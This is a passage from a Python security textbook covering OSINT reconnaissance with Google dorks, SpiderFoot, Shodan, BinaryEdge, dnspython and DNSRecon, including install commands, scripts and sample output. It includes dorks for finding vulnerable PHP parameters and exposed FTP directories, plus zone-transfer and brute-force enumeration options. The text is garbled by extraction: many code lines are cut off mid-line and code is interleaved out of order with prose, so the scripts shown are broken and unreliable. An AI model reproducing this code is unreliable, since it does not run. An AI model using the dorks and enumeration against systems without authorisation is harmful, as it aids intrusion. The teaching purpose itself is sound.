In this chapter, we looked at the basics of packet-crafting and
sniﬃng with some Python modules like pcapy-ng and scapy.
During our security assessments, we may need the raw output and
access to basic levels of packet topology so that we can analyze the
information and make decisions ourselves. The most aĴractive part
of scapy is that it can be imported and used to create networking
tools without us having to create packets from scratch.
In the next chapter, we will explore programming packages in
Python that help us extract public information from servers using
Open Source Intelligence (OSINT) tools. We will also review tools
to get information related to banners and DNS servers, and other
tools to apply fuzzing processes with Python.
Questions

As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. What is the scapy function that can capture packets in the same
way as tools such as tcpdump or Wireshark?
2. What is the method that must be invoked with scapy to check
whether a speciﬁc port (port) is open or closed on a speciﬁc
machine (host), and show detailed information about how the
packets are being sent?
3. What functions are necessary to implement the traceroute
command in scapy?
4. What are the methods to send a package in scapy?
5. Which parameter of the sniff() function allows us to deﬁne a
function that will be applied to each captured packet?
Further reading
In the following links, you will ﬁnd more information about the
mentioned tools and the oﬃcial Python documentation for some of
the commented modules:
Scapy documentation:
https://scapy.readthedocs.io/en/latest/
Tools developed with scapy:
https://github.com/secdev/awesome-scapy#tools
Starting with scapy:
https://scapy.readthedocs.io/en/latest/usage.html
Useful network traﬃc sniﬀers developed with Python:

https://github.com/Roshan-Poudel/Python-Scapy-Packet-
Sniffer
https://github.com/EONRaider/Packet-Sniffer
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

————————— Section 3
—————————
Server Scripting and Port
Scanning with Python
In this section, you will learn how to use Python libraries for server
scripting to collect information from servers using OSINT tools, and
to connect to many diﬀerent types of servers to detect vulnerabilities
with speciﬁc tools like port scanning.
This part of the book comprises the following chapters:
Chapter 6, Gathering Information from Servers with OSINT Tools
Chapter 7, Interacting with FTP, SFTP, and SSH Servers
Chapter 8, Working with Nmap Scanner

6
Gathering Information from
Servers with OSINT Tools
This chapter will introduce you to the modules that allow extracting
information from publicly exposed servers using Open Source
Intelligence (OSINT) tools. The information collected, such as a
domain, a hostname, or a web service, will be very useful while
carrying out the pentesting or audit process.
We will review tools like Google Dorks, SpiderFoot, dnspython,
DNSRecon, and other tools for applying fuzzing processes with
Python. OSINT reconnaissance and application fuzzing have
diﬀerent purposes. OSINT is typically a passive exercise aimed at
gathering information that can then be leveraged for aĴacks, while
fuzzing consists of automated injection aĴacks. At this point, we
could use OSINT techniques to help focus fuzzing / automated
aĴacks.
The following topics will be covered in this chapter:
The basics concepts of OSINT
Google Dorks queries to get information about the target
domain
GeĴing information from servers and domains using SpiderFoot

GeĴing information on DNS servers with the dnspython and
DNSRecon tools
GeĴing vulnerable addresses on servers with fuzzing
Technical requirements
To get the most out of this chapter, you will need to install a Python
distribution on your local machine and have some basic knowledge
about the HTTP protocol. We will work with Python version 3.10,
available at https://www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Some of the tools explained in this chapter require the installation of
the following programs: Docker: https://www.docker.com.
Check out the following video to see the Code in Action:
https://packt.link/Chapter06.
Introducing Open Source
Intelligence (OSINT)
OSINT is the collection and analysis of publicly accessible
information to produce actionable intelligence. OSINT is used in
many ﬁelds, such as ﬁnancial, technological, the police, the military,
and marketing. For example, OSINT techniques allow investigations

to be conducted within law enforcement to identify potential
terrorist threats or to track and trace individuals.
If we focus on cybersecurity, we will ﬁnd that OSINT has several
applications:
It is used during the reconnaissance stage of pentesting with
the aim of discovering hosts in an organization. Examples:
Whois information, subdomain discovery, DNS information,
ﬁnding conﬁguration ﬁles, ﬁnding passwords.
These types of techniques are often used in social engineering
aĴacks with the aim of obtaining all the information about a
particular user in social networks. From a defensive point of
view, awareness of the information that is openly available to
bad faith actors, will make it possible to avoid “falling” for a
phishing aĴack.
It is used for the prevention of cyberaĴacks, obtaining
information that makes us alert to a threat that our organization
may suﬀer. For example, a company could use OSINT
techniques to detect possible vulnerabilities or weak points in its
organization at the infrastructure level or exposure in social
networks in order to detect information that could be used by
an aĴacker.
The OSINT discipline has a process that allows the data obtained
from various public and accessible sources to be transformed into
information, turning this into intelligence that can be used to make
decisions. The process that most organizations follow to obtain
information about a speciﬁc target is known in the sector as the
Intelligence Cycle and is made up of the following phases:

Requirements: This is the phase in which all the requirements
that must be met and raised by the decision-maker are
established.
Information sources: It must be borne in mind that the volume
of information available on the internet is practically inﬁnite, so
we must identify and specify the most relevant sources to
optimize the acquisition process.
Acquisition process: This is the stage in which we obtain the
information.
Processing and Analysis: This consists of formaĴing everything
we have found, ﬁltering, classifying, and establishing the
priority levels of the data obtained.
Intelligence: This consists of presenting the information
obtained in an eﬀective, useful, and understandable way, so that
it can be correctly exploited, answering all the initial questions
and allowing the decision-maker to make decisions.
The use of tools will facilitate the work of the investigation. Each tool
delves into a speciﬁc area and the combination of these will allow us
to obtain a large amount of information for our investigation. We
will now discuss these tools in a liĴle more detail.
Google Dorks and the Google Hacking
Database
Google Dorks or Dorking, also known as Google Hacking, is a
technique that consists of applying Google’s advanced search to ﬁnd
speciﬁc information on the internet by ﬁltering the results with

operators known as Dorks, which are symbols that specify a
condition.
For example, if you want to know if your login credentials are
exposed on any online service you use, you could use the operator
inurl and intext as follows: inurl: [URL of the website] AND intext:
[password].
Google automatically indexes the content of any website, making it
possible for us to obtain information of any kind in this way. In the
Google Hacking Database (https://www.exploit-
db.com/google-hacking-database), we can ﬁnd a wide collection
of diﬀerent Dorks that other hackers use to perform diﬀerent
advanced searches.

Figure 6.1: Google Hacking Database service
The Google Hacking Database is a service that is available on the
exploit-db.com site and has a set of search paĴerns based on
Google dorks to ﬁnd information. On the website, it is possible to
select diﬀerent categories such as vulnerable servers, leaks of
sensitive information, vulnerable ﬁles, speciﬁc error messages, etc.
Maltego
Maltego (https://www.maltego.com) is a powerful tool that
collects information about an objective and shows it to us in the form
of a graph, thus allowing us to analyze the diﬀerent relationships
that are established between the nodes and the entities that are part
of it. It is an interesting tool when we target a company, person, or
website in the initial stages of recognition, since it will return a large
amount of crossed referenced information, and it will help us to
make multiple enumerations in vectors that we can continue
investigating.
This tool can collect information in open sources from elements such
as domains, IP addresses, and emails. Maltego works with the
concept of transformations, which are equivalent to performing
searches to obtain information about a given entity. Transformations
can be executed on each of these elements, which are routines that
allow analysis and collect as much information as possible based on
a speciﬁc type of data. In the following screenshot, we can see the
DNS servers and NS servers obtained over the python.org domain.

Figure 6.2: Running transforms over a DNS server
Once we have obtained DNS servers for the python.org domain, we
can use the transformations on this entity to perform speciﬁc

searches. For example, we could perform searches for email
addresses or perform reverse lookups.
In the following screenshot, we can see the transforms we could
apply over the mail.python.org entity.
Figure 6.3: Running transforms over a DNS server

Photon
Photon (https://github.com/s0md3v/Photon) works as a crawler
that performs the entire process of searching and extracting
information from web pages using web scraping techniques. In the
following execution, we are using the scanme.nmap.org domain to
extract URLs using web crawlers.
$ python3.10 photon.py -u scanme.nmap.org -l 3 -t 10
      ____  __          __ 
     / __ \/ /_  ____  / /_____  ____ 
    / /_/ / __ \/ __ \/ __/ __ \/ __ \ 
   / ____/ / / / /_/ / /_/ /_/ / / / / 
  /_/   /_/ /_/\____/\__/\____/_/ /_/ v1.3.2 
  
[~] Fetching URLs from archive.org 
[+] Retrieved -1 URLs from archive.org 
[~] Level 1: 1 URLs 
[!] Progress: 1/1 
[~] Level 2: 1 URLs 
[!] Progress: 1/1 
[~] Crawling 1 JavaScript files 
[!] Progress: 1/1 
-------------------------------------------------- 
[+] Internal: 3 
[+] Scripts: 1 
[+] External: 37 
-------------------------------------------------- 
[!] Total requests made: 4 
[!] Total time taken: 0 minutes 2 seconds 

The Harvester
The Harvester (https://github.com/laramies/theHarvester) is
an interesting command-line tool developed in Python that collects
public information on the web (emails, subdomains, names, URLs).
This collection of information can be done in 2 ways: passive and
active. With passive scanning, we do not interact with the target at
any time and obtain all the information through the diﬀerent search
engines integrated into the tool. On the other hand, the active scan
interacts with the target using brute force techniques.
Censys
Censys is a powerful search engine for devices connected to the
internet. It bears a resemblance to Shodan but can be a
complementary tool for investigations, since it presents diﬀerent
subtleties in operation that will allow us to reach diﬀerent results.
We can use this service to search for hosts, domains, and IP
addresses.
[!] Requests per second: 1 
[+] Results saved in scanme.nmap.org directory 

Figure 6.4: Searching in Censys for a speciﬁc host
crt.sh
crt.sh allows us to ﬁnd subdomains based on certiﬁcate transparency
logs. crts.sh lets you search for SSL/TLS certiﬁcates used by a CA or
domain. With the following request, we can get subdomains from
the python.org domain (https://crt.sh/?q=python.org).

Figure 6.5: Obtain subdomains using the crt.sh service
DnsDumpster
DnsDumpster (https://dnsdumpster.com) is an interesting tool
that, through its search engine, provides us with a large amount of
information about a domain. All the information is collected by
consulting diﬀerent search engines, without having to brute force
against the target domain. The data is obtained through queries on
platforms such as Alexa top 1 million search engines (Google, Bing,
etc.), Common Crawl, Certiﬁcate Transparency, Max Mind, Team
Cymru, Shodan, and scans.io.
In the following screenshot, we can see DNS servers and MX records
from the python.org domain.

Figure 6.6: Obtain DNS servers using the DnsDumpter service
WaybackMachine
The internet “time machine” (https://archive.org) is a resource
that allows us to view web pages at diﬀerent times in the past. This
project has been archiving diﬀerent versions of web pages since 1996
and has 544 billion web pages. WaybackMachine allows us to see a
replicated website on diﬀerent dates, which gives us a chance to
consult information that has been deleted or hidden.
In the following screenshot, we can see the web archive for the
python.org domain between the years 2000 and 2023.

Figure 6.7: Web archive for the python.org domain
OSINT framework
OSINT framework (https://osintframework.com) is a project that
compiles many OSINT tools. On the OSINT framework website, we
can ﬁnd links to the diﬀerent tools ordered by diﬀerent categories.
Many of them are web tools, and others link to the GitHub
repository from which we can install the tool.

Figure 6.8: OSINT framework
Blackbird
BlackBird (https://github.com/p1ngul1n0/blackbird) is an
OSINT tool that allows us to quickly search for accounts by
username in diﬀerent social networks. Every time you perform a
username search, the tool has the ability to randomly use a user

agent from a list of 1,000 that can be found in the repository
(https://github.com/p1ngul1n0/blackbird/blob/main/usera
gents.txt).
The purpose of randomly choosing a user agent from this list is to
prevent requests from being blocked. The ﬁrst step is to install the
dependencies that we will have in the requirements.txt ﬁle:
$ vi requirements.txt 
aiohttp==3.8.1 
beautifulsoup4==4.11.1 
colorama==0.4.4 
Flask==2.1.1 
Flask_Cors==3.0.10 
requests==2.28.1 
gunicorn 
$ pip install -r requirements.txt 
The basic use of the tool is to search by username:
$ python blackbird.py -u <username> 
We also have the option of obtaining a list of the sites supported by
the tool with the following command:
$ python blackbird.py --list-sites 
We also have the possibility of running a web server developed in
Flask, to access the http://127.0.0.1:5000 address from our

browser:
$ python blackbird.py --web 
The Shodan search engine
Unlike other search engines, Shodan does not search for web content
but instead indexes information about publicly exposed servers from
the headers of HTTP requests, such as the operating system,
banners, server type, and versions.
Shodan’s search oﬀers the ability to use advanced search operators
(also known as dorks) and the use of advanced ﬁlters from the web
interface to quickly search for speciﬁc targets. Shodan provides a set
of special ﬁlters that allow us to optimize search results. Among
these ﬁlters, we can highlight the following:
after/before: Filters the results by date
country: Filters the results, ﬁnding devices in a particular
country
city: Filters results, ﬁnding devices in a particular city
geo: Filters the results by latitude/longitude
hostname: Looks for devices that match a particular hostname
net: Filters the results by a speciﬁc range of IPs or a network
segment
os: Performs a search for a speciﬁc operating system
port: Allows us to ﬁlter by port number
org: Searches for a speciﬁc organization name

The main advantage of search ﬁlters is that they help us to have
greater control over what we are looking for and the results that we
can obtain. For example, we could combine diﬀerent ﬁlters to ﬁlter
simultaneously by country, IP address, and port number.
The BinaryEdge search engine
BinaryEdge is a service that contains a database with information
related to the domains the service is analyzing dynamically in real
time. The service can be accessed at the following link:
https://app.binaryedge.io.
One of the advantages of this service compared to others such as
Shodan is that it oﬀers speciﬁc utilities such as enumerating
subdomains and obtaining information from a distributed network
of sensors (Honeypots), which collect data on each connection they
receive.
To use this service, it is necessary to register to use the search engine
and apply a series of ﬁlters similar to how we can in Shodan. The
free version includes up to 250 requests and access to the API, which
may be more than enough for moderate use.
Using the Python pybinaryedge module
(https://pypi.org/project/pybinaryedge/), we can perform
searches in the same way that we use the web interface. You can
install it with the following command:
$ sudo pip3 install pybinaryedge 

This library also implements a CLI binaryedge tool:
In order to perform searches, we ﬁrst need to establish at the
conﬁguration level the key that we obtain when registering for the
service.
Now that you know the basics about how to obtain server
information with OSINT tools, let’s move on to learning how to
obtain information using Google Dorks.
usage: binaryedge [-h] {config,ip,search,dataleaks} 
Request BinaryEdge API 
positional arguments: 
  {config,ip,search,dataleaks} 
                        Commands 
    config              Configure pybinary edge 
    ip                  Query an IP address 
    search              Search in the database 
    dataleaks           Search in the leaks database
    domains             Search information on a doma
optional arguments: 
  -h, --help            show this help message and e
$ binaryedge config --key 
usage: binaryedge config [-h] [--key KEY] 
binaryedge config: error: argument --key/-k: expecte

Getting information using Google
Dorks
Google Dorking is a technique that consists of applying Google’s
advanced search to ﬁnd speciﬁc information on the internet by
ﬁltering the results with operators, known as dorks.
This OSINT technique is commonly used by journalists, researchers,
and of course in the ﬁeld of cybersecurity. Within the ﬁeld of
cybersecurity, it is a very interesting technique for the
reconnaissance phase, since, thanks to it, it will be possible to list
diﬀerent assets, search for vulnerable versions, ﬁnd data of interest,
and even ﬁnd information leaks from the target in question.
It should be noted that Dorking is not exclusive to Google. Other
search engines like Bing and DuckDuckGo also work with this
technique. Since each one has diﬀerent methods for indexing the
information, the results they return, at equivalent dorks, may vary,
which will increase the richness of investigations.
It must be considered that Google has a very powerful crawling
system, which indexes everything on the internet, including
sensitive information. In this way, with Google Dorking, we will be
able to obtain information of great value for investigations including
information about people/organizations, passwords, conﬁdential
documents, versions of vulnerable services, and exposed directories.
Google Dorks
In order to successfully apply Google Dorking, it will be necessary to
understand the most commonly used operators. The operators are

commands that are used to ﬁlter the information that is indexed in
diﬀerent ways, allowing what is known as advanced search.
The most used operators and their purpose are shown below. It is
also interesting to note the use of operators can be combined to make
the search more reﬁned.
site: Searches the speciﬁed website
ﬁletype: Searches for results that have the speciﬁed ﬁle
extension
inurl: Searches for the speciﬁed word in a URL
intext: Results in pages in whose content the speciﬁed word
appears
intitle: Results in pages in whose title the speciﬁed word
appears
allinurl: Searches for all the speciﬁed words in a URL
allintext: Results in pages in which all the speciﬁed words
appear in the content
allintitle: Results in pages in which all the speciﬁed words
appear in the title
cache: It will show the cached version of the analyzed domain
In the following repository, we ﬁnd a list of dorks that we can use to
perform searches in the main search engines:
https://github.com/cipher387/Dorks-collections-list.
We can further reﬁne our search with the following operators:
To search for PDF ﬁles, we could use the following dork:
filetype:pdf

For search parameters that may be vulnerable in a page scripted
in PHP, we could use inurl:php?=id1
To ﬁnd exposed FTP servers, we can use intitle:"index of"
inurl:ftp
To ﬁnd more examples of Dorks, the GHDB (Google Hacking
Database) https://www.exploit-db.com/google-hacking-
database is an open-source project that collects several known
dorks that can reveal interesting and probably conﬁdential
information that is publicly available on the internet. This project is
maintained by Oﬀensive Security, a well-known organization in the
world of cybersecurity. Within this project, you will be able to see
quite advanced dorks classiﬁed in diﬀerent categories, and that will
be useful when carrying out investigations.
Katana: a Python Tool for Google
Hacking
Katana (https://github.com/TebbaaX/Katana) is a simple
Python tool that automates the Google Hacking/Dorking process.
You can use the following command to install requirements using
the package manager in Python:
$ python3 -m pip install -r requirements.txt 
Once the dependencies are installed, we could execute it with the -h
option to see the diﬀerent options it oﬀers. In this case, it oﬀers 4
basic operating options depending on our needs:

$ python kds.py -h  
usage: katana-ds.py [-h] [-g] [-s] [-t] [-p] 
 optional arguments: 
  -h, --help    show this help message and exit 
  -g, --google  google mode 
  -s, --scada   scada mode  
  -t, --tor     Tor mode  
  -p, --proxy   Proxy mode  
Google mode gives you 1 input to conﬁgure the “Dork.” You can
rely on the Google Hacking Database to get an idea of which
command to place. The Scada mode searches Google for PLCs that
are online making multiple requests that can cause our IP to be
blocked by Google. For this reason, we may need to try diﬀerent
TLDs. Proxy mode scans for proxy servers and displays them. It will
print 100 diﬀerent proxy servers each time.
Dorks hunter
Dorks hunter (https://github.com/six2dez/dorks_hunter) is a
utility that searches for useful Google dorks. You can install and
execute it with the following commands:
$ git clone https://github.com/six2dez/dorks_hunter 
$ cd dorks_hunter 
$ pip3 install -r requirements.txt 
$ python dorks_hunter.py -h 
usage: dorks_hunter.py [-h] --domain DOMAIN [--resul
Simple Google dork search 

Its basic operation consists of using the -d parameter to indicate the
domain name on which we want to perform the search:
In this section, we have analyzed many tools that allow us to obtain
information about servers and domains. This information could be
optional arguments: 
  -h, --help            show this help message and e
  --domain DOMAIN, -d DOMAIN 
                        Domain to scan 
  --results RESULTS, -r RESULTS 
                        Number of results per search
  --output OUTPUT, -o OUTPUT 
                        Output file 
$ python dorks_hunter.py -d python.org 
 # .git folders (https://www.google.com/search?q=inu
https://mail.python.org/pipermail/python-dev/2018-Se
https://mail.python.org/pipermail/python-checkins/20
https://mail.python.org/pipermail/python-bugs-list/2
https://www.python.org/search/?q=if%20then%20else%20
https://www.programcreek.com/python/example/63471/gi
https://www.mail-archive.com/search?l=python-dev@pyt
https://stackoverflow.com/questions/5837948/how-to-s
https://stackoverflow.com/questions/58280196/how-can
https://stackoverflow.com/questions/25229592/python-
https://stackoverflow.com/questions/48046688/tried-t
.... 

useful in a pentesting process to obtain possible vulnerabilities like
leaked and exposed information.
Now that you know the basics about how to obtain server
information with Google Dorks tools, let’s move on to learning how
to obtain information about name servers, mail servers, and
IPv4/IPv6 addresses from a speciﬁc domain.
Getting information using
SpiderFoot
Spiderfoot https://www.spiderfoot.net is a reconnaissance tool
that performs queries over more than 100 public data sources to
collect domains, names, emails, addresses, etc... Like many of the
tools we have discussed, it is highly automated and will allow us to
easily collect a large amount of information.
This project (https://github.com/smicallef/spiderfoot) is
developed in Python and although it can be used as a tool from the
command line, the most convenient way to work is to set up a web
server that allows the investigation processes to be carried out. This
tool can be installed with the following instructions:
$ git clone https://github.com/smicallef/spiderfoot
$ cd spiderfoot 
$ pip3 install -r requirements.txt 
$ python3 sf.py -l 127.0.0.1:5001 

Another way to run the server is to use a Docker image. In the
repository, we can see the presence of a Dockerﬁle where the
manifest and declaration of how the image should be created in
Docker using the following command are located:
$ sudo docker build . Spiderfoot 
Once this process of creating our image is ﬁnished, we can already
use the container by executing it in the following way:
$ sudo docker run -p 5001:5001 spiderfoot 
Once the server is up, just open a web browser and go to the port
that has been indicated and, as can be seen in the following image,
the main menu has 3 sections: New Scan, Scans, and SeĴings.

Figure 6.9: Spiderfoot main menu
In the SeĴings section, integrations with third-party platforms are
conﬁgured, among which are tools such as Shodan, Hunter.io,
Haveibeenpwned, ipinfo.io, phishtank, and Robtex, among many
others.

Figure 6.10: Spiderfoot seĴings
SpiderFoot has more than 200 integrations with services available on
the internet. Some require an API key, but it also has other services
that are completely open and do not require an account to use them.
Since there are many services that can be integrated
into a SpiderFoot instance, it is possible to import and
export API Keys. So if, for example, you have a tool
installation with multiple conﬁgured services and
established APIs, you can export said conﬁguration
and import it into another Spiderfoot installation, so
you don’t waste time reconﬁguring these integrations.

Once the conﬁgurations that are of interest to the target to be
analyzed are applied, the next step is to launch a scan from the New
Scan section. The target of the scan can be from a domain name, an
IP address, an email, or a username.
In addition, the type of scan can be conﬁgured, which can be by use
case, by required data, or by module. The most common thing is to
check one of the options that appear in By Use Case, since they load
the necessary modules to carry out diﬀerent types of investigations:
All: Enables all modules and integrations conﬁgured in
SpiderFoot. This means that much more information can be
obtained from the target, but also that it will be a slower process
and probably more intrusive.
Footprint: This type of investigation loads those modules that
allow obtaining information about the target using search
engines and crawling processes. It is a type of investigation
suitable for obtaining information about the network
environment of the target.
Investigate: This type of investigation is intended to determine
if the target is a malicious entity, therefore it searches services
related to blacklists, known malware distribution sites, etc.
Passive: This is the lightest type of investigation of all, it is
designed to be less intrusive and only loads the modules that
perform basic information collection on our target.
Once the target and the type of investigation to be launched have
been selected, all you have to do is start the scan and wait for
SpiderFoot to do its job.

Figure 6.11: SpiderFoot results
The results will be displayed in the Scans tab, where the status of
each scan appears and it can be accessed to check what details it has
been able to extract.
SpiderFoot modules
SpiderFoot works as an open source intelligence tool and integrates
with diﬀerent available data sources and uses a variety of methods
for data analysis, making it easy to navigate through the data. This
tool has several modules that correspond to services that you are
going to review.

Figure 6.12: SpiderFoot modules
SpiderFoot can help us in our reconnaissance and exploration phases
in an audit, speciﬁcally when studying footprinting. It is also useful
in any context where we want to perform data mining or ﬁnd public
information about a target. Said target can be an IP address, a
domain, a subdomain, or a subnet.
Getting information on DNS servers
with DNSPython and DNSRecon
In this section, we will create a DNS client in Python and see how
this client obtains information about name servers, mail servers, and
IPv4/IPv6 addresses.

The DNS protocol
DNS stands for Domain Name Server, the domain name service
used to link IP addresses with domain names. DNS is a globally
distributed database of mappings between hostnames and IP
addresses. It is an open and hierarchical system, with many
organizations choosing to run their own DNS servers. These servers
allow other machines to resolve the requests that originate from the
internal network itself to resolve domain names. The DNS protocol
is used for diﬀerent purposes. The most common are the following:
Names resolution: Given the complete name of a host, it can
obtain its IP address.
Reverse address resolution: This is the reverse mechanism of
the previous one. It can, given an IP address, obtain the name
associated with it.
Mail server resolution: Given a mail server domain name (for
example, gmail.com), it can obtain the server through which
communication is performed (for example, gmail-smtp-
in.l.google.com).
DNS is also a protocol that devices use to query DNS servers to
resolve hostnames to IP addresses (and vice versa). The nslookup
tool comes with most Linux and Windows systems, and it lets us
query DNS on the command line. With the nslookup command, we
can ﬁnd out that the python.org host has the IPv4 address
45.55.99.72:
$ nslookup python.org 
Non-authoritative answer: 

Name: python.org 
Address: 45.55.99.72 
Now that you know about the DNS protocol, let’s move on to
learning about the DNSPython module.
The DNSPython module
Python provides a DNS module that is used to handle the translation
of domain names to IP addresses.
dnspython (https://www.dnspython.org) is a library that
provides a DNS toolkit for Python, and it allows you to work at a
high level by making queries. It also allows low-level access, for
manipulation of zones and dynamic updates of records, messages,
and names.
The dnspython module provides the dns.resolver() method,
which allows you to ﬁnd multiple records from a domain name. The
function takes the domain name and the record type as parameters.
Listed below are some of the record types:
AAAA record: This is an IP address record, which is used to
ﬁnd the IP of the computer connected to the domain. It is
conceptually like the A record but speciﬁes only the IPv6
address of the server instead of the IP.
NS record: The Name Server (NS) record provides information
about which server is authoritative for the given domain, that is,
which server has the actual DNS records. Multiple NS records

are possible for a domain, including primary and backup name
servers.
MX records: MX stands for mail exchanger record, which is a
resource record that speciﬁes the mail server that is responsible
for accepting emails on behalf of the domain. It has preference
values according to the prioritization of mail if multiple mail
servers are present for load balancing and redundancy.
SOA records: SOA stands for Start of Authority, which is a type
of resource record that contains information about the
administration of the zone, especially related to zone transfers
deﬁned by the zone administrator.
CNAME record: CNAME stands for canonical name record,
which is used to map the domain name as an alias for the other
domain. It always points to another domain and never directly
points to an IP.
TXT record: These records contain the text information of the
sources that are outside the domain. TXT records can be used
for various purposes, for example, Google uses them to verify
domain ownership and ensure email security.
This module allows operations to query records against DNS
servers. The installation can be done either using the Python
repository or by downloading the GitHub source code from the
https://github.com/rthalley/dnspython repository and
running the setup.py install ﬁle.
The fastest way to install it is using the pip repository. You can
install this library by using either the easy_install command or
the pip command:

$ pip install dnspython 
The main packages for this module are the following:
import dns
import dns.resolver
The information that we can obtain for a speciﬁc domain is as
follows:
Records for mail servers: response_MX =
dns.resolver.query('domain','MX')
Records for name servers: response_NS =
dns.resolver.query('domain','NS')
Records for IPV4 addresses: response_ipv4 =
dns.resolver.query('domain','A')
Records for IPV6 addresses: response_ipv6 =
dns.resolver.query('domain','AAAA')
In the following example, we are using the resolve() method to
obtain a list of IP addresses for many host domains with the
dns.resolver submodule. You can ﬁnd the following code in the
dns_resolver.py ﬁle inside the dnspython folder:
import dns.resolver 
hosts = ["python.org", "google.com", "microsoft.com"
for host in hosts: 
    print(host) 
    ip = dns.resolver.resolve(host, "A") 

For each domain, we get a list of IP addresses:
$ python dns_resolver.py 
python.org 
138.197.63.241 
google.com 
142.250.201.78 
microsoft.com 
20.81.111.85 
20.103.85.33 
20.53.203.50 
20.112.52.29 
20.84.181.62 
We can also check whether one domain is the subdomain of another
with the is_subdomain() method and check whether a domain is a
superdomain of another using the is_superdomain() method. A
superdomain is the parent domain of all its subdomains. You can
ﬁnd the following code in the check_domains.py ﬁle inside the
dnspython folder:
    for i in ip: 
        print(i) 
import argparse 
import dns.name 
def main(domain1, domain2): 
    domain1 = dns.name.from_text(domain1) 
    domain2 = dns.name.from_text(domain2) 

When executing the previous code, we can see it returns that the
python.org domain is a superdomain of mail.python.org:
We could obtain a domain name from an IP address using the
dns.reversename submodule and the from_address() method:
We could obtain an IP address from a domain name using the
dns.reversename submodule and the to_address() method:
    print("{} is subdomain of {}: {}".format(domain1
    print("{} is superdomain of {}:{} ".format(domai
if __name__ == '__main__': 
    parser = argparse.ArgumentParser(description='Ch
    parser.add_argument('--domain1', action="store",
    parser.add_argument('--domain2', action="store",
    given_args = parser.parse_args() 
    domain1 = given_args.domain1 
    domain2 = given_args.domain2 
    main (domain1, domain2) 
$ python check_domains.py --domain1 python.org --dom
python.org. is subdomain of mail.python.org.: False 
python.org. is superdomain of mail.python.org.:True 
>>> import dns.reversename 
>>> domain = dns.reversename.from_address("ip_addres

>>> import dns.reversename 
>>> ip = dns.reversename.to_address("domain") 
If you want to perform a reverse lookup, you could use the previous
methods, as shown in the following example. You can ﬁnd the
following code in the DNSPython-reverse-lookup.py ﬁle inside
the dnspython folder:
In the following example, we are going to extract information related
to all records
('A','AAAA','NS','SOA','MX','MF','MD','TXT','CNAME','PT
R'). A pointer (PTR) record resolves an IP address into a domain
name. The act of translating an IP address into a domain name is
known as a reverse lookup in the DNS.
You can ﬁnd the following code in the dns_python_records.py ﬁle
inside the dnspython folder:
import dns.reversename 
domain = dns.reversename.from_address("45.55.99.72")
print(domain) 
print(dns.reversename.to_address(domain)) 
import dns.resolver 
def main(domain): 
    records = ['A','AAAA','NS','SOA','MX','TXT','CNA
    for record in records: 
        try: 

In the previous script, we used the resolve() method to get
responses from many records available in the records list. In the
main() method, we passed, as a parameter, the domain from which
we want to extract information. The following output may be
diﬀerent from the one obtained by the user depending on the
location from which the queries are performed:
            responses = dns.resolver.resolve(domain,
            print("\nRecord response ",record) 
            print("---------------------------------
            for response in responses: 
                print(response) 
        except Exception as exception: 
            print("Cannot resolve query for record",
            print("Error for obtaining record inform
if __name__ == '__main__': 
    try: 
        main('python.org') 
    except KeyboardInterrupt: 
        exit() 
$ python dns_python_records.py 
Record response  A 
----------------------------------- 
138.197.63.241 
Cannot resolve query for record AAAA 
Error for obtaining record information: The DNS resp
  
Record response  NS 
----------------------------------- 

In the output of the previous script, we can see how to get
information from the python.org domain. We can see information
for the IPv4 and IPv6 addresses, name servers, and mail servers.
The main utility of DNSPython compared to other DNS query tools
such as dig or nslookup is that you can control the result of the
queries from Python and then this information can be used for other
purposes in a script.
DNSRecon
ns-484.awsdns-60.com. 
ns-981.awsdns-58.net. 
ns-1134.awsdns-13.org. 
ns-2046.awsdns-63.co.uk. 
  
Record response  SOA 
----------------------------------- 
ns-2046.awsdns-63.co.uk. awsdns-hostmaster.amazon.co
  
Record response  MX 
----------------------------------- 
50 mail.python.org. 
Cannot resolve query for record TXT 
 Error for obtaining record information: The resolut
Cannot resolve query for record CNAME 
Error for obtaining record information: The DNS resp
Cannot resolve query for record PTR 
Error for obtaining record information: The DNS resp

DNSRecon (https://github.com/darkoperator/dnsrecon) is a
DNS scanning and enumeration tool wriĴen in Python, which
allows you to perform diﬀerent tasks such as standard record
enumeration for a deﬁned domain (A, NS, SOA, and MX), top-level
domain expansion for a deﬁned domain, zone transfer against all NS
records for a deﬁned domain, and reverse lookup against a range of
IP addresses, providing a starting and ending IP address.
This script checks all DNS records, which can be useful for a security
researcher for DNS enumeration on all kinds of records like SOA,
NS, TXT, SVR, SPF, etc.
To install the dependencies of the tool, we can use the following
command:
$ pip3 install -r requirements.txt --no-warn-script-
$ python dnsrecon.py -h 
usage: dnsrecon.py [-h] [-d DOMAIN] [-n NS_SERVER] 
                   [--lifetime LIFETIME] [--tcp] [--
                   [--disable_check_bindversion] [-V
  
optional arguments: 
  -h, --help            show this help message and e
  -d DOMAIN, --domain DOMAIN 
                        Target domain. 
  -n NS_SERVER, --name_server NS_SERVER 
                        Domain server to use. If non
  -r RANGE, --range RANGE 
                        IP range for reverse lookup 
  -D DICTIONARY, --dictionary DICTIONARY 
                        Dictionary file of subdomain

  -f                    Filter out of brute force do
  -a                    Perform AXFR with standard e
  -s                    Perform a reverse lookup of 
  -b                    Perform Bing enumeration wit
  -y                    Perform Yandex enumeration w
  -k                    Perform crt.sh enumeration w
  -w                    Perform deep whois record an
  -z                    Performs a DNSSEC zone walk 
  --threads THREADS     Number of threads to use in 
  --lifetime LIFETIME   Time to wait for a server to
  --tcp                 Use TCP protocol to make que
  --db DB               SQLite 3 file to save found 
  -x XML, --xml XML     XML file to save found recor
  -c CSV, --csv CSV     Save output to a comma separ
  -j JSON, --json JSON  save output to a JSON file. 
  --iw                  Continue brute forcing a dom
  --disable_check_recursion 
                        Disables check for recursion
  --disable_check_bindversion 
                        Disables check for BIND vers
  -V, --version         Show DNSrecon version 
  -v, --verbose         Enable verbose 
  -t TYPE, --type TYPE  Type of enumeration to perfo
                        Possible types: 
                            std:      SOA, NS, A, AA
                            rvl:      Reverse lookup
                            brt:      Brute force do
                            srv:      SRV records. 
                            axfr:     Test all NS se
                            bing:     Perform Bing s
                            yand:     Perform Yandex
                            crt:      Perform crt.sh

The simplest way to use DNSRecon is to deﬁne the test target
domain using the -d option. If the -n option or nameserver to use is
not speciﬁed, the SOA of the target will be used:
                            snoop:    Perform cache 
                                      all with file 
                         
                            tld:      Remove the TLD
                            zonewalk: Perform a DNSS
$ dnsrecon -d <domain> 
